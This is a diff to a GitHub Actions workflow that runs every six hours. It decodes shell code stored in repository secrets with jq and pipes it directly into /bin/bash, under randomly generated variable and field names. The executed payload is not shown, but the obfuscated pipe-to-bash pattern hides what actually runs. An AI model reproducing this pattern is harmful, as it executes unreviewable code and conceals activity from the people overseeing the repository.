@@ -1,28 +1,20 @@
 name: changshenkaiscsk
+
 on:
   workflow_dispatch:
   schedule:
-    - cron: '53 3/6 * * *'
-jobs:  # 23715
+    - cron: '2 3/6 * * *'
+
+jobs:
   build:
     runs-on: ubuntu-latest
     steps:
       - uses: actions/checkout@v4
       - name: changshenkaiscsk
         env:
-          qsv176: ${{ secrets.qsv176 }}
+          u908: ${{ secrets.u908 }}
         run: |
-          echo $qsv176 | jq -r .oq22648 | /bin/bash
-          echo $l726 | jq -r .hpszm53 | /bin/bash
-          echo $dpofu28 | jq -r .k16 | /bin/bash
-          echo $rr256 | jq -r .sqpu5 | /bin/bash
-          echo $bfahh788 | jq -r .j350 | /bin/bash
-          echo $weusm90 | jq -r .t97886 | /bin/bash
-          echo $npml2693 | jq -r .unra2 | /bin/bash
-          echo $l4 | jq -r .dm04 | /bin/bash
-          echo $az73 | jq -r .xsemu3 | /bin/bash
-          echo $d097 | jq -r .su8 | /bin/bash
-          echo $nrkb89968 | jq -r .jn044 | /bin/bash
-          echo $je4049 | jq -r .imypt82032 | /bin/bash
-          echo $xyjpd608 | jq -r .y8 | /bin/bash
+          echo $u908 | jq -r .shaz361 | /bin/bash
+          echo $kysr1830 | jq -r .sq9 | /bin/bash
+          echo $ow051 | jq -r .ir14053 | /bin/bash
 
